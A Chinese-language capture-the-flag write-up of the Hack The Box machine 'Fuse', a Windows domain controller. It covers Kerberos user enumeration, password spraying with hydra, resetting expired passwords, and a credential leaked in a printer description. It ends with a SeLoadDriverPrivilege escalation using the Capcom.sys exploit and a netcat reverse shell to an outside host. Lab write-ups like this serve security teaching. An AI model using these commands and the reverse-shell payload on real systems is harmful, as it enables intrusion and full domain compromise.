# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测
查看开启端口
```
┌──(root💀kali)-[~/htb]
└─# nmap -p- 10.10.10.193 --open
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-05 20:53 EST
Nmap scan report for 10.10.10.193
Host is up (0.35s latency).
Not shown: 65514 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49678/tcp open  unknown
49701/tcp open  unknown
49702/tcp open  unknown

```

查看端口详细信息
```
─(root💀kali)-[~/htb]
└─# nmap -sV -T4 -A -O 10.10.10.193 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49675,49676,49678,49701,49702
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-05 21:08 EST
Nmap scan report for fuse.fabricorp.local (10.10.10.193)
Host is up (0.58s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-01-06 02:21:25Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  msrpc        Microsoft Windows RPC
49701/tcp open  msrpc        Microsoft Windows RPC
49702/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h52m59s, deviation: 4h37m09s, median: 12m58s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2022-01-05T18:22:46-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-06T02:22:47
|_  start_date: 2022-01-06T02:05:53

TRACEROUTE (using port 88/tcp)
HOP RTT       ADDRESS
1   490.15 ms 10.10.16.1
2   733.78 ms fuse.fabricorp.local (10.10.10.193)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.01 seconds

```

显然是一台DC，域名：```fabricorp.local```

## web

80端口打开跳到一个域名，把域名添加到host文件：
```echo "10.10.10.193   fuse.fabricorp.local">>/etc/hosts```



另外页面下载的打印记录里显示打印机的名称是HP-MFT01,应该是一台惠普打印机

5月份打印记录
```
PaperCut Print Logger - http://www.papercut.com/
Time,User,Pages,Copies,Printer,Document Name,Client,Paper Size,Language,Height,Width,Duplex,Grayscale,Size
2020-05-29 17:50:10,pmerton,1,1,HP-MFT01,"New Starter - bnielson - Notepad",JUMP01,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,19kb,
2020-05-29 17:53:55,tlavel,1,1,HP-MFT01,"IT Budget Meeting Minutes - Notepad",LONWK015,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,52kb,
2020-05-30 16:37:45,sthompson,1,1,HP-MFT01,"backup_tapes - Notepad",LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,20kb,
2020-05-30 16:42:19,sthompson,1,1,HP-MFT01,"mega_mountain_tape_request.pdf",LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,104kb,
2020-05-30 17:07:06,sthompson,1,1,HP-MFT01,"Fabricorp01.docx - Word",LONWK019,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,153kb,
```

6月份打印记录
```
PaperCut Print Logger - http://www.papercut.com/
Time,User,Pages,Copies,Printer,Document Name,Client,Paper Size,Language,Height,Width,Duplex,Grayscale,Size
2020-06-10 17:40:21,bhult,1,1,HP-MFT01,"offsite_dr_invocation - Notepad",LAPTOP07,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,19kb,
2020-06-10 19:18:17,administrator,1,1,HP-MFT01,"printing_issue_test - Notepad",FUSE,LETTER,PCL6,,,NOT DUPLEX,GRAYSCALE,16kb,

```

80端口看起来像是一个打印机历史记录网站，收集到几个用户名,整理成一个名单
```
pmerton
tlavel
sthompson
bhult
administrator
guest
Fuse
JUMP01
LONWK015
LONWK019
LAPTOP07
HP-MFT01
```

## kerberos

验证上面名单用户是否是域用户
```
┌──(root💀kali)-[~/htb/Fuse]
└─# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="fabricorp.local",userdb=/root/htb/Fuse/user 10.10.10.193
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-06 01:54 EST
Nmap scan report for fuse.fabricorp.local (10.10.10.193)
Host is up (0.27s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     sthompson@fabricorp.local
|     administrator@fabricorp.local
|     pmerton@fabricorp.local
|     tlavel@fabricorp.local
|     Fuse@fabricorp.local
|_    bhult@fabricorp.local

Nmap done: 1 IP address (1 host up) scanned in 3.60 seconds

```

有效的域用户名单为：
```
tlavel
bhult
sthompson
administrator
pmerton
Fuse
```


查看是否有不需要预认证的用户
```
┌──(root💀kali)-[~/htb/Fuse]
└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py fabricorp.local/ -usersfile /root/htb/Fuse/user  -outputfile hashes.asreproast -dc-ip 10.10.10.193
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[-] User pmerton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tlavel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sthompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bhult doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Fuse doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```

没有。

## smb
enum4linux 没有任何有用的东西

rpcclient 可以匿名登录，但是没有权限
```
┌──(root💀kali)-[~/htb/Fuse]
└─# rpcclient -U "" -N 10.10.10.193                                                                             130 ⨯
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 

```

smbclient尝试匿名登录，但是没有权限
```
┌──(root💀kali)-[~/htb/Fuse]
└─# smbclient --no-pass -L 10.10.10.193                                                                         130 ⨯
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.193 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

smbmap匿名也没有权限
```
┌──(root💀kali)-[~/htb/Fuse]
└─# smbmap -H 10.10.10.193 -u "" -p ""         
[+] IP: 10.10.10.193:445        Name: fuse.fabricorp.local                              
                                                               
┌──(root💀kali)-[~/htb/Fuse]
└─# smbmap -H 10.10.10.193 -u "svc-print" -p ""
[!] Authentication error on 10.10.10.193

```

## ldap
没有权限查不到任何东西
```
┌──(root💀kali)-[~/htb/Fuse]
└─# ldapsearch -x -h 10.10.10.193 -D 'fabricorp.local/svc-print' -w '' -b "DC=fabricorp,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=fabricorp,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A6C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839

# numResponses: 1

```

## smb爆破

用cewl命令从web上收集信息作为密码字典，爆破上面的用户列表
```
┌──(root💀kali)-[~/htb/Fuse]
└─# cewl --with-numbers -w passwd.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
WARNING: Nokogiri was built against libxml version 2.9.10, but has dynamically loaded 2.9.12

```

现在我们收集到了一个密码字典passwd.txt

使用hydra爆破smb密码
```
┌──(root💀kali)-[~/htb/Fuse]
└─# hydra -L user -P passwd.txt 10.10.10.193 smb
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-08 00:31:27
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1183 login tries (l:7/p:169), ~1183 tries per task
[DATA] attacking smb://10.10.10.193:445/
[445][smb] Host: 10.10.10.193 Account: tlavel Valid password, password expired and must be changed on next logon
[445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01
[445][smb] Host: 10.10.10.193 Account: bhult Valid password, password expired and must be changed on next logon
[445][smb] host: 10.10.10.193   login: bhult   password: Fabricorp01
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-08 01:07:23

```

发现两个账户凭据：
> tlavel：Fabricorp01
> bhult：Fabricorp01

尝试登陆smb，提示密码过期
```
┌──(root💀kali)-[~/htb/Fuse]
└─# crackmapexec smb 10.10.10.193 -u 'tlavel' -p 'Fabricorp01' --shares
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
SMB         10.10.10.193    445    FUSE             [-] Error enumerating shares: SMB SessionError: 0x5b

```

tlavel和bhult的密码用smbpasswd把密码改成```Fabricorp02```
```
┌──(root💀kali)-[~/htb/Fuse]
└─# smbpasswd -r 10.10.10.193  tlavel                                                                                                       1 ⨯
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user tlavel on 10.10.10.193.

┌──(root💀kali)-[~/htb/Fuse]
└─# smbpasswd -r 10.10.10.193  bhult                                                                                                        1 ⨯
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user bhult on 10.10.10.193.

```

或者用smbpasswd.py修改smb密码
```
┌──(root💀kali)-[~/htb/Fuse]
└─# python3 /root/impacket-master/examples/smbpasswd.py  fabricorp.local/tlavel:Fabricorp01@10.10.10.193 -newpass 'Fabricorp02'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.

```


再用新密码登录smb,看见已经可以显示分享目录
```
┌──(root💀kali)-[~/htb/Fuse]
└─# crackmapexec smb 10.10.10.193 -u 'tlavel' -p 'Fabricorp02' --shares
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\tlavel:Fabricorp02 
SMB         10.10.10.193    445    FUSE             [+] Enumerated shares
SMB         10.10.10.193    445    FUSE             Share           Permissions     Remark
SMB         10.10.10.193    445    FUSE             -----           -----------     ------
SMB         10.10.10.193    445    FUSE             ADMIN$                          Remote Admin
SMB         10.10.10.193    445    FUSE             C$                              Default share
SMB         10.10.10.193    445    FUSE             HP-MFT01                        HP-MFT01
SMB         10.10.10.193    445    FUSE             IPC$                            Remote IPC
SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share 
SMB         10.10.10.193    445    FUSE             print$          READ            Printer Drivers
SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share 

```

奇怪的是，这个修改的密码通常用一次后面就不能再使用了，需要再次修改密码，而原密码还是Fabricorp01。可能是靶机作者担心原密码修改了以后影响其他人员做的某种定时任务之类的东西？

但是这个密码并不能使用evil-winrm，smbexec.py，psexec.py等工具登录

使用修改的凭证，登录rpcclient，拿到完整的域user名单

```
┌──(root💀kali)-[~/htb/Fuse]
└─# rpcclient -U tlavel%Fabricorp06 10.10.10.193
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
rpcclient $> 

```

整理user list为：
```
Administrator
Guest
krbtgt
DefaultAccount
svc-print
bnielson
sthompson
tlavel
pmerton
svc-scan
bhult
dandrews
mberbatov
astein
dmuir
```

使用enumprinters枚举打印机信息，爆出一个密码：```$fab@s3Rv1ce$1```
```
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]


```


## Spray for Password

hydra爆破这个密码匹配的用户
```
┌──(root💀kali)-[~/htb/Fuse]
└─# hydra -L user -p '$fab@s3Rv1ce$1' 10.10.10.193 smb
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-08 06:16:20
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 15 login tries (l:15/p:1), ~15 tries per task
[DATA] attacking smb://10.10.10.193:445/
[445][smb] host: 10.10.10.193   login: svc-print   password: $fab@s3Rv1ce$1
[445][smb] host: 10.10.10.193   login: svc-scan   password: $fab@s3Rv1ce$1
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-08 06:16:33

```

等到两个用户凭据：```svc-scan：$fab@s3Rv1ce$1```和```svc-print：$fab@s3Rv1ce$1```

使用```svc-print：$fab@s3Rv1ce$1```拿到foodhold
```
┌──(root💀kali)-[~/htb/Fuse]
└─#  evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'           123 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                           

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                             

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
fabricorp\svc-print

```

# 提权

查看本账户权限，注意```SeLoadDriverPrivilege```

谷歌搜索```seloaddriverprivilege privilege escalation```找到[这篇文章](https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)

这里有文章的[中文版本](https://www.anquanke.com/post/id/148227)

（我理解）这个漏洞利用的原理是，SeLoadDriverPrivilege就是允许非特权用户加载驱动程序，此时如果加载的恶意的驱动程序，恶意代码就可以加载到系统的内核中执行，从而实现提权。


```
*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```



用于编译的源代码[在此](https://github.com/TarlogicSecurity/EoPLoadDriver/)



但是也可以选择release版本,下载下面两个文件，上传到靶机
[ExploitCapcom.exe](https://github.com/clubby789/ExploitCapcom/releases/download/1.0/ExploitCapcom.exe)
[Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

执行
> .\ExploitCapcom.exe LOAD C:\Users\svc-print\Documents\Capcom.sys
> .\ExploitCapcom.exe EXPLOIT whoami


```
*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe LOAD C:\Users\svc-print\Documents\Capcom.sys
[*] Service Name: xhqhfuts
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\????????????????s
NTSTATUS: 00000000, WinError: 0
*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000023513930008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
nt authority\system

```

打印出了提权后的权限

传nc到靶机，使用下面payload

>  .\ExploitCapcom.exe EXPLOIT "C:\Users\svc-print\Documents\nc.exe 10.10.14.5 4444 -e cmd.exe"

```
*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe EXPLOIT "C:\Users\svc-print\Documents\nc.exe 10.10.14.5 4444 -e cmd.exe"
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 000001D17CB20008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed

```

拿到提权的反弹shell

```
┌──(root💀kali)-[~/htb/Fuse]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.193] 50179
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\svc-print\Documents>whoami
whoami
nt authority\system

```


# 总结
这台foothold感觉有点ctf的味道，提权部分看其他人的walkthrough好多卡在源代码编译环节上，网上找到了相关的资源就直接拿来用了。

AD部分只是出现在用户枚举，后来提权的时候用bloodhound看本账户到domain Admin的路径，本账户输入IT Account组，IT Account可以远程登录fuse.fabricorp.local电脑，这台电脑存有admin的session，理论上好像也可以提权，但是我没有验证。

另外另一个账号sthompson原来是Domain Admins组成员,理论上提权到这个账号也可以成功提权，不过没找到这个账号的更多信息。
```
*Evil-WinRM* PS C:\Users\svc-print\Documents> net user sthompson
User name                    sthompson
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/30/2020 3:30:57 PM
Password expires             Never
Password changeable          5/31/2020 3:30:57 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/30/2020 3:31:56 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *IT_Accounts
                             *Domain Admins
The command completed successfully.

```